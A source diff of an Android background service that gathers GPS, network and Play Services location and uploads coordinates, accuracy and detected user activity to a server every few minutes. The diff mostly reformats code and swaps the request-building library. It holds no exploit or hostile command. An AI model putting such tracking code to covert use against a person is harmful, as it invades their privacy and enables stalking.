@@ -2,9 +2,22 @@ package com.inet.android.location;
 
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
+import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
+
+import com.google.android.gms.common.ConnectionResult;
+import com.google.android.gms.common.GooglePlayServicesUtil;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationServices;
+import com.inet.android.request.AppConstants;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.ConvertDate;
+import com.inet.android.utils.Logging;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -23,31 +36,17 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.util.Log;
 
-import com.google.android.gms.common.ConnectionResult;
-import com.google.android.gms.common.GooglePlayServicesUtil;
-import com.google.android.gms.common.api.GoogleApiClient;
-import com.google.android.gms.location.LocationRequest;
-import com.google.android.gms.location.LocationServices;
-import com.inet.android.request.AppConstants;
-import com.inet.android.request.DataRequest;
-import com.inet.android.utils.AppSettings;
-import com.inet.android.utils.ConvertDate;
-import com.inet.android.utils.Logging;
-import com.loopj.android.http.RequestParams;
-
 /**
  * LocationTracker class is designed to monitoring location
  * 
  * @author johny homicide
  * 
  */
-public class LocationTracker extends Service implements GpsStatus.Listener,
-		LocationListener, GoogleApiClient.ConnectionCallbacks,
-		GoogleApiClient.OnConnectionFailedListener,
-		com.google.android.gms.location.LocationListener {
+public class LocationTracker extends Service
+		implements GpsStatus.Listener, LocationListener, GoogleApiClient.ConnectionCallbacks,
+		GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
 
-	private static final String TAG = LocationTracker.class.getSimpleName()
-			.toString();
+	private static final String TAG = LocationTracker.class.getSimpleName().toString();
 	private LocationValue locationValue;;
 	private static final int SERVICE_REQUEST_CODE = 15;
 	// The minimum distance to change Updates in meters
@@ -57,8 +56,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	private static final int FIVE = 5;
 
 	// Update frequency in milliseconds
-	private static final long UPDATE_INTERVAL_IN_FIVE_MINUTE = MILLISECONDS_PER_MINUTE
-			* FIVE;
+	private static final long UPDATE_INTERVAL_IN_FIVE_MINUTE = MILLISECONDS_PER_MINUTE * FIVE;
 
 	// The minimum time between updates in milliseconds
 	private static long MIN_TIME_BW_UPDATES; // get minute
@@ -78,20 +76,16 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 
 	@Override
 	public void onCreate() {
-		Logging.doLog(TAG, "LocationTracker onCreate()",
-				"LocationTracker onCreate()");
+		Logging.doLog(TAG, "LocationTracker onCreate()", "LocationTracker onCreate()");
 		mContext = getApplicationContext();
 	}
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
-		int timeUp = AppSettings.getSetting(
-				AppConstants.TYPE_LOCATION_TRACKER_REQUEST, this);
-		geoMode = AppSettings.getSetting(AppConstants.LOCATION_TRACKER_MODE,
-				this);
-		locationManager = (LocationManager) mContext
-				.getSystemService(LOCATION_SERVICE);
+		int timeUp = AppSettings.getSetting(AppConstants.TYPE_LOCATION_TRACKER_REQUEST, this);
+		geoMode = AppSettings.getSetting(AppConstants.LOCATION_TRACKER_MODE, this);
+		locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);
 
 		if (timeUp == 0) {
 			Logging.doLog(TAG, "Location Stop", "Location Stop");
@@ -102,9 +96,8 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		setCalendar(FIVE);
 
 		MIN_TIME_BW_UPDATES = timeUp * MILLISECONDS_PER_MINUTE;
-		Logging.doLog(TAG, "onStartCommand LocationTracker "
-				+ MIN_TIME_BW_UPDATES, "onStartCommand LocationTracker "
-				+ MIN_TIME_BW_UPDATES);
+		Logging.doLog(TAG, "onStartCommand LocationTracker " + MIN_TIME_BW_UPDATES,
+				"onStartCommand LocationTracker " + MIN_TIME_BW_UPDATES);
 
 		// ----------is work ---------------------------------------------------
 
@@ -127,13 +120,11 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	private void setCalendar(int timeUp) {
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
-		PendingIntent servicePendingIntent = PendingIntent.getService(this,
-				SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),
-				PendingIntent.FLAG_UPDATE_CURRENT);
+		PendingIntent servicePendingIntent = PendingIntent.getService(this, SERVICE_REQUEST_CODE,
+				new Intent(this, LocationTracker.class), PendingIntent.FLAG_UPDATE_CURRENT);
 
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
-		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
-				servicePendingIntent);
+		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), servicePendingIntent);
 	}
 
 	private Location setOnLocationManager() {
@@ -141,12 +132,10 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			Logging.doLog(TAG, "GetLocation ", "GetLocation ");
 
 			// --------------- getting GPS status-----------------
-			isGPSEnabled = locationManager
-					.isProviderEnabled(LocationManager.GPS_PROVIDER);
+			isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
 
 			// --------------- getting network status-------------
-			isNetworkEnabled = locationManager
-					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+			isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
 
 			// --------------- getting geo_mode ------------------
 
@@ -189,8 +178,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	// -----------------search last coordinates-----------------------
 
 	private void getLast() {
-		SimpleDateFormat TIMESTAMP = new SimpleDateFormat(
-				"yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+		SimpleDateFormat TIMESTAMP = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
 		Location bestResult = null;
 		String bestProvider = null;
 		double latitude = 0; // latitude
@@ -203,14 +191,12 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		long minTime = 0;
 		List<String> matchingProviders = locationManager.getAllProviders();
 		matchingProviders.add("GooglePlayService");
-		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
-				+ matchingProviders.toString());
+		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan " + matchingProviders.toString());
 
 		for (String provider : matchingProviders) {
 			if (provider.equals("GooglePlayService"))
 				if (googleApiClient != null && locationValue.isLocationClient())
-					location = LocationServices.FusedLocationApi
-							.getLastLocation(googleApiClient);
+					location = LocationServices.FusedLocationApi.getLastLocation(googleApiClient);
 				else
 					location = locationManager.getLastKnownLocation(provider);
 
@@ -221,9 +207,8 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 
 				// Выводим Дату по шаблону
 				String date2 = TIMESTAMP.format(time);
-				Logging.doLog(TAG, "last update " + provider + " " + date2
-						+ " accuracy" + accuracy, "last update " + provider
-						+ " " + date2 + " accuracy" + accuracy);
+				Logging.doLog(TAG, "last update " + provider + " " + date2 + " accuracy" + accuracy,
+						"last update " + provider + " " + date2 + " accuracy" + accuracy);
 				long timeSys = System.currentTimeMillis();
 				minTime = timeSys - UPDATE_INTERVAL_IN_FIVE_MINUTE;
 				if ((time > minTime && accuracy < bestAccuracy)) {
@@ -233,8 +218,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 					bestAccuracy = accuracy;
 					bestTime = time;
 					bestProvider = provider;
-				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
-						&& time > bestTime) {
+				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE && time > bestTime) {
 					bestResult = location;
 					bestTime = time;
 					bestProvider = provider;
@@ -245,9 +229,9 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			}
 
 		}
-		Logging.doLog(TAG, "bestProvider " + bestProvider + " best time: "
-				+ bestTime + " best accuracy " + bestAccuracy, "bestProvider "
-				+ bestProvider + " best accuracy" + bestAccuracy);
+		Logging.doLog(TAG,
+				"bestProvider " + bestProvider + " best time: " + bestTime + " best accuracy " + bestAccuracy,
+				"bestProvider " + bestProvider + " best accuracy" + bestAccuracy);
 
 		locationValue.setProvider(bestProvider);
 		locationValue.setLatitude(latitude);
@@ -268,15 +252,14 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 
 	private void netLoc() {
 		// locMetod = "network";
-		locationManager.requestLocationUpdates(
-				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
+		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
 				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
 	}
 
 	private void gpsLoc() {
 		// locMetod = "network";
-		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
-				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
+		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES,
+				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
 	}
 
 	private void sendLoc() {
@@ -289,29 +272,21 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			// String activity = sp.getString("activity", "0");
 			String activity = RecognitionDevService.getActivityDevice();
 			Logging.doLog(TAG, "activity" + activity, "activity" + activity);
-			RequestParams params = new RequestParams();
+
+			Map<String, Object> location = new HashMap<String, Object>();
+			Map<String, String> info = new HashMap<String, String>();
+			location.put("type", AppConstants.TYPE_LOCATION_TRACKER_REQUEST);
+			location.put("time", ConvertDate.logTime());
 			if (activity != null && !activity.equals(""))
-				params.put("data[][info][ttl]", locationValue.getProvider()
-						+ " " + " " + activity);
-			if (activity != null && !activity.equals(""))
-				params.put("data[][info][ttl]", locationValue.getProvider()
-						+ " " + " " + activity);
+				info.put("ttl", locationValue.getProvider() + " " + " " + activity);
 			else
-				params.put("data[][info][ttl]", locationValue.getProvider());
-			params.put("data[][info][data]", locationValue.getLatitude() + ","
-					+ locationValue.getLongitude());
-			params.put("data[][info][accuracy]",
-					String.format("%.02f", locationValue.getAccuracy()));
+				info.put("ttl", locationValue.getProvider());
+			info.put("accuracy", String.format("%.02f", locationValue.getAccuracy()));
+			info.put("data", locationValue.getLatitude() + "," + locationValue.getLongitude());
 
-			params.put("data[][time]", ConvertDate.logTime());
-			params.put("data[][type]", Integer
-					.toString(AppConstants.TYPE_LOCATION_TRACKER_REQUEST));
-			params.put("key", System.currentTimeMillis());
+			location.put("info", info);
 
-			Log.d(TAG, params.toString());
-
-			DataRequest dataReq = new DataRequest(mContext);
-			dataReq.sendRequest(params);
+			RequestList.sendDataRequest(location,  null,mContext);
 
 		}
 	}
@@ -319,7 +294,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	/**
 	 * Function to show settings alert dialog On pressing Settings button will
 	 * lauch Settings Options
-	 * */
+	 */
 
 	@Override
 	public void onLocationChanged(Location location) {
@@ -348,18 +323,15 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		/* This is called when the GPS status alters */
 		switch (status) {
 		case LocationProvider.OUT_OF_SERVICE:
-			Logging.doLog(TAG, "Status Changed: Out of Service",
-					"Status Changed: Out of Service");
+			Logging.doLog(TAG, "Status Changed: Out of Service", "Status Changed: Out of Service");
 
 			break;
 		case LocationProvider.TEMPORARILY_UNAVAILABLE:
-			Logging.doLog(TAG, "Status Changed: Temporarily Unavailable",
-					"Status Changed: Temporarily Unavailable");
+			Logging.doLog(TAG, "Status Changed: Temporarily Unavailable", "Status Changed: Temporarily Unavailable");
 
 			break;
 		case LocationProvider.AVAILABLE:
-			Logging.doLog(TAG, "Status Changed: Available",
-					"Status Changed: Available");
+			Logging.doLog(TAG, "Status Changed: Available", "Status Changed: Available");
 			break;
 		}
 	}
@@ -384,8 +356,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			break;
 		case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
 			if (locationValue.getGPSFix() == true) {
-				Logging.doLog(TAG, "GPS_EVENT_SATELLITE_STATUS",
-						"GPS_EVENT_SATELLITE_STATUS");
+				Logging.doLog(TAG, "GPS_EVENT_SATELLITE_STATUS", "GPS_EVENT_SATELLITE_STATUS");
 
 				Iterable<GpsSatellite> satellites = status.getSatellites();
 
@@ -397,8 +368,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 					i += 1;
 				}
 				locationValue.setSatsAvailable(i);
-				Logging.doLog(TAG,
-						Integer.toString(locationValue.getSatsAvailable()),
+				Logging.doLog(TAG, Integer.toString(locationValue.getSatsAvailable()),
 						Integer.toString(locationValue.getSatsAvailable()));
 
 				if (locationValue.getSatsAvailable() >= 4) {
@@ -421,8 +391,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	@Override
 	public void onConnectionFailed(ConnectionResult connectionResult) {
 		// TODO Auto-generated method stub
-		Logging.doLog(TAG, "onConnectionFailed: " + connectionResult,
-				"onConnectionFailed: " + connectionResult);
+		Logging.doLog(TAG, "onConnectionFailed: " + connectionResult, "onConnectionFailed: " + connectionResult);
 		locationValue.setLocationClient(false);
 
 		if (connectionResult.hasResolution()) {
@@ -438,26 +407,19 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	@Override
 	public void onConnected(Bundle arg0) {
 		// TODO Auto-generated method stub
-		Logging.doLog(TAG, "Connected to Google Play Services: " + arg0,
-				"Connected to Google Play Services: " + arg0);
-		mLocationRequest = LocationRequest.create()
-				.setInterval(MIN_TIME_BW_UPDATES).setFastestInterval(5000L)
+		Logging.doLog(TAG, "Connected to Google Play Services: " + arg0, "Connected to Google Play Services: " + arg0);
+		mLocationRequest = LocationRequest.create().setInterval(MIN_TIME_BW_UPDATES).setFastestInterval(5000L)
 				.setSmallestDisplacement(10.0F);
-		Logging.doLog(TAG, "geomode setPrioity: " + geoMode,
-				"geomode setPrioity: " + geoMode);
+		Logging.doLog(TAG, "geomode setPrioity: " + geoMode, "geomode setPrioity: " + geoMode);
 		if (geoMode == 1)
-			mLocationRequest
-					.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+			mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
 		else
-			mLocationRequest
-					.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
+			mLocationRequest.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
 
-		Logging.doLog(TAG, "connect locationClient " + googleApiClient,
-				"connect locationClient " + googleApiClient);
+		Logging.doLog(TAG, "connect locationClient " + googleApiClient, "connect locationClient " + googleApiClient);
 		if (googleApiClient != null)
 			if (googleApiClient.isConnected()) {
-				LocationServices.FusedLocationApi.requestLocationUpdates(
-						googleApiClient, mLocationRequest, this);
+				LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, mLocationRequest, this);
 				locationValue.setLocationClient(true);
 			}
 		getLast();
@@ -467,16 +429,14 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	private void createApiGoogle() {
 		Logging.doLog(TAG, "createApiGoogle", "createApiGoogle");
 
-		googleApiClient = new GoogleApiClient.Builder(this)
-				.addApi(LocationServices.API).addConnectionCallbacks(this)
+		googleApiClient = new GoogleApiClient.Builder(this).addApi(LocationServices.API).addConnectionCallbacks(this)
 				.addOnConnectionFailedListener(this).build();
 		googleApiClient.connect();
 	}
 
 	private boolean servicesAvailable() {
 
-		int resultCode = GooglePlayServicesUtil
-				.isGooglePlayServicesAvailable(this);
+		int resultCode = GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);
 		if (ConnectionResult.SUCCESS == resultCode) {
 			Log.d(TAG, "Google Play services is available.");
 			return true;
@@ -487,21 +447,17 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 
 	private void stopPlayService() {
 		Log.d(TAG, "stopPlayService()");
-		if (LocationServices.FusedLocationApi != null
-				&& googleApiClient != null) {
+		if (LocationServices.FusedLocationApi != null && googleApiClient != null) {
 			locationValue.setLocationClient(false);
-			LocationServices.FusedLocationApi.removeLocationUpdates(
-					googleApiClient, this);
+			LocationServices.FusedLocationApi.removeLocationUpdates(googleApiClient, this);
 			googleApiClient.disconnect();
 		}
 	}
 
 	private void stopUpdateLocationPlayService() {
 		Log.d(TAG, "stopPlayService()");
-		if (LocationServices.FusedLocationApi != null
-				&& googleApiClient != null) {
-			LocationServices.FusedLocationApi.removeLocationUpdates(
-					googleApiClient, this);
+		if (LocationServices.FusedLocationApi != null && googleApiClient != null) {
+			LocationServices.FusedLocationApi.removeLocationUpdates(googleApiClient, this);
 		}
 	}
 
